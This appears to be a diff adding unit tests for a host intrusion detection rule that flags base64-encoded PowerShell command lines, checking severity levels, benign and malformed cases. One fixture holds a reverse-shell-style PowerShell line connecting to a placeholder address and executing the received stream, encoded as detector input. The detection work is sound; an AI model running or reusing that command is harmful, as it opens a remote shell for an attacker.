@@ -1,3 +1,4 @@
+import base64
 import json
 import platform
 import tempfile
@@ -152,6 +153,55 @@ class HostHidsTests(unittest.TestCase):
         process = HostEvent.create("host-1", "process_start", "fixture",
                                    executable_path=r"C:\Users\Alice\AppData\Local\Temp\malware.exe")
         self.assertEqual(engine.evaluate(process)[0].rule_id, "HIDS-EXEC-001")
+
+    def test_encoded_powershell_detection_and_incident(self) -> None:
+        command = '$c=New-Object System.Net.Sockets.TCPClient("192.0.2.8",4444); iex $c.GetStream()'
+        encoded = base64.b64encode(command.encode("utf-16-le")).decode("ascii")
+        with tempfile.TemporaryDirectory() as directory:
+            agent = HostAgent(HostConfig(host_id="host-1", database_path=Path(directory) / "host.sqlite3",
+                                         enabled_collectors=set()))
+            try:
+                event = HostEvent.create("host-1", "process_start", "fixture", process_id=77,
+                                         process_name="powershell.exe",
+                                         executable_path=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+                                         metadata={"command_line": ["powershell.exe", "-e", encoded]})
+                agent.ingest_event(event)
+                alerts = agent.database.list_alerts()
+                self.assertEqual(len(alerts), 1)
+                self.assertEqual(alerts[0]["rule_id"], "HIDS-EXEC-002")
+                self.assertEqual(alerts[0]["severity"], "high")
+                self.assertTrue(alerts[0]["evidence"]["network_execution_pattern"])
+                self.assertNotIn(encoded, json.dumps(alerts[0]))
+                detail = agent.database.get_incident_detail(alerts[0]["incident_id"])
+                self.assertEqual(detail["events"][0]["event_id"], event.event_id)
+                second = HostEvent.create("host-1", "process_start", "fixture", process_id=78,
+                                          process_name="powershell.exe", executable_path=event.executable_path,
+                                          metadata={"command_line": ["powershell.exe", "-e", encoded]})
+                agent.ingest_event(second)
+                self.assertEqual(len(agent.database.list_alerts()), 2)
+                self.assertEqual(len(agent.database.list_incidents()), 2)
+            finally:
+                agent.stop()
+
+    def test_encoded_powershell_rule_limits_and_false_positives(self) -> None:
+        engine = HostDetectionEngine(HostConfig(host_id="host-1"))
+
+        def process(name: str, arguments: list[str]) -> HostEvent:
+            return HostEvent.create("host-1", "process_start", "fixture", process_name=name,
+                                    executable_path=f"C:/Windows/System32/{name}",
+                                    metadata={"command_line": arguments})
+
+        benign = base64.b64encode('Write-Output "hello"'.encode("utf-16-le")).decode("ascii")
+        finding = engine.evaluate(process("powershell.exe", ["powershell.exe", "-EncodedCommand", benign]))
+        self.assertEqual(len(finding), 1)
+        self.assertEqual(finding[0].severity, "medium")
+        self.assertFalse(finding[0].evidence["network_execution_pattern"])
+        self.assertEqual(engine.evaluate(process("notepad.exe", ["notepad.exe", "-e", benign])), [])
+        self.assertEqual(engine.evaluate(process("powershell.exe", ["powershell.exe", "-ExecutionPolicy", "Bypass"])), [])
+        malformed = engine.evaluate(process("pwsh.exe", ["pwsh.exe", "-ec", "not-base64!"]))
+        self.assertEqual(len(malformed), 1)
+        self.assertEqual(malformed[0].severity, "medium")
+        self.assertFalse(malformed[0].evidence["network_execution_pattern"])
 
     def test_windows_agent_has_host_collectors(self) -> None:
         with tempfile.TemporaryDirectory() as directory:
